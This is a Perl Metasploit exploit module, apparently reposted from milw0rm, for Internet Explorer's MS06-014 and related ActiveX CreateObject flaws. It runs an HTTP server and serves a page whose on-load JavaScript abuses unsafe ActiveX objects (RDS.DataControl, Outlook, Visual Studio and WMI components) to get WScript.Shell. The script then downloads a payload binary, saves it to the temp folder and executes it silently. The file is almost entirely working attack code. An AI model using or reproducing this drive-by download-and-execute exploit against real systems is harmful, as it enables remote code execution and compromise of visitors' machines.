##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_createobject;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           => 'Internet Explorer COM CreateObject Code Execution',
	'Version'        => '$Revision: 3753 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a generic code execution vulnerability in Internet 
		Explorer by abusing vulnerable ActiveX objects. 
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  },

	'Payload'        =>
	  {
		'Space'    => 4000,
		'Keys'     => ['-bind'],
	  },
	'Refs'           =>
	  [
		['MSB', 'MS06-014']
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
	  	[ 'Automatic' ],

		# Patched
		[ 'MS06-014 - RDS.DataControl', '{BD96C556-65A3-11D0-983A-00C04FC29E36}'],

		# Not marked as safe
		[ 'UNKNOWN  - RDS.DataSpace', '{BD96C556-65A3-11D0-983A-00C04FC29E36}'],

		# Not marked as safe
		[ 'UNKNOWN  - Business Object Factory ', '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}'],
		
		# Not marked as safe
		[ 'UNKNOWN  - Outlook Data Object', '{0006F033-0000-0000-C000-000000000046}'],

		# Found exploitable in the wild (no details)
		[ 'UNKNOWN  - Outlook.Application', '{0006F03A-0000-0000-C000-000000000046}'],

		# These are restricted by site (might be exploitable via DNS spoofing + SSL fun)
		[ 'UNKNOWN  - SoftwareDistribution.MicrosoftUpdateWebControl.1', '{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}'],
		[ 'UNKNOWN  - SoftwareDistribution.WebControl.1', '{6414512B-B978-451D-A0D8-FCFDF33E833C}'],

		# Part of the WMI SDK, currently unpatched/unreported
		[ 'UNKNOWN  - WMIScriptUtils.WMIObjectBroker2.1', '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}'],
		
		# Visual Studio components, not marked as safe
		[ 'UNKNOWN  - VsmIDE.DTE', '{06723E09-F4C2-43c8-8358-09FCD1DB0766}'],
		[ 'UNKNOWN  - DExplore.AppObj.8.0', '{639F725F-1B2D-4831-A9FD-874847682010}'],
		[ 'UNKNOWN  - VisualStudio.DTE.8.0', '{BA018599-1DB3-44f9-83B4-461454C84BF8}'],
		[ 'UNKNOWN  - Microsoft.DbgClr.DTE.8.0', '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}'],
		[ 'UNKNOWN  - VsaIDE.DTE', '{E8CCCDDF-CA28-496b-B050-6C07C962476B}'],			
	  ],

	'Keys'           => [ 'ie' ],

	'DisclosureDate' => '',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;

	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = ($self->GetVar('HTTPHOST') eq '0.0.0.0') ?
	  Pex::Utils::SourceIP('1.2.3.4') :
	  $self->GetVar('HTTPHOST');

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self      = shift;
	my $fd        = shift;
	my $shellcode = my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	 
	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read the HTTP headers
	my $headers;
	while ( (my $line = $fd->RecvLine(10))) {
		$headers .= $line;
		last if $line eq "\r\n";
	}

	if ($url =~ /\?payload/) {
		$self->PrintLine("[*] HTTP Client $rhost:$rport asked for payload...");
		my $content = Pex::Utils::CreateWin32PE($shellcode, 'ie_createobject');
		$fd->Send($self->BuildResponse($content, 'application/octet-stream'));
		$fd->Close;
		return;
	}
	$self->PrintLine("[*] HTTP Client $rhost:$rport asked for exploit page...");
	$fd->Send($self->BuildResponse($self->GenerateHTML(), 'text/html'));
	$fd->Close;
	return;
}

sub GenerateHTML {
	my $self       = shift;
	my $target_idx = $self->GetVar('TARGET');
	my $objects    = "";
	
	if ($target_idx == 0) {
		foreach my $target (@{ $self->Targets }) {
			if ($target->[1]) {
				$objects .= "'".$target->[1]."',";
			}
		}
	} else {
		my $target = $self->Targets->[$target_idx];
		$objects .= "'".$target->[1]."',";
	}

	my $data  = 
qq#
<html><head><title></title>
<script language="javascript">

function Log(m) {
	var log = document.createElement('p');
	log.innerHTML = m;
	document.body.appendChild(log);
	
}

function CreateO(o, n) {
	var r = null;
	
	try { eval('r = o.CreateObject(n)') }catch(e){}
	
	if (! r) {
		try { eval('r = o.CreateObject(n, "")') }catch(e){}
	}
	
	if (! r) {
		try { eval('r = o.CreateObject(n, "", "")') }catch(e){}
	}

	if (! r) {
		try { eval('r = o.GetObject("", n)') }catch(e){}
	}
	
	if (! r) {
		try { eval('r = o.GetObject(n, "")') }catch(e){}
	}
	
	if (! r) {
		try { eval('r = o.GetObject(n)') }catch(e){}
	}
	
	return(r);	
}

function Go(a) {
	Log('Creating helper objects...');
	var s = CreateO(a, "WScript.Shell");
	var o = CreateO(a, "ADODB.Stream");
	var e = s.Environment("Process");
	
	Log('Ceating the XMLHTTP object...');
	var url = document.location + '?payload';
	var xml = null;
	var bin = e.Item("TEMP") + "metasploit.exe";
	var dat; 
	
	try { xml=new XMLHttpRequest(); }
	catch(e) {
		try { xml = new ActiveXObject("Microsoft.XMLHTTP"); }
		catch(e) {
			xml = new ActiveXObject("MSXML2.ServerXMLHTTP");
		}
	}
	
	if (! xml) return(0);

	Log('Downloading the payload...');	
	xml.open("GET", url, false)
	xml.send(null);
	dat = xml.responseBody;

	Log('Writing the payload to disk...');	
	o.Type = 1;
	o.Mode = 3;
	o.Open();
	o.Write(dat);
	o.SaveToFile(bin, 2);

	Log('Executing the payload...');		
	s.Run(bin,0);
}

function Exploit() {
	var i = 0;
	var t = new Array(${objects}null);
	
	while (t[i]) {
		var a = null;
		
		if (t[i].substring(0,1) == '{') {
			a = document.createElement("object");
			a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
		} else {
			try { a = new ActiveXObject(t[i]); } catch(e){}
		}
		
		if (a) {
			try {		
				var b = CreateO(a, "WScript.Shell");
				if (b) {
					Log('Loaded ' + t[i]);
					Go(a);
					return(0);
				}
			} catch(e){}
		}
		i++;
	}
	Log('Exploit failed.');
}
</script>
</head>
<body onload='Exploit()'>
<p>Initializing...</p>
</body>
</html>
#;
}

sub BuildResponse {
	my ($self, $content, $type) = @_;
	$type ||= 'text/plain';

	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: $type\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}

1;

# milw0rm.com [2006-08-10]
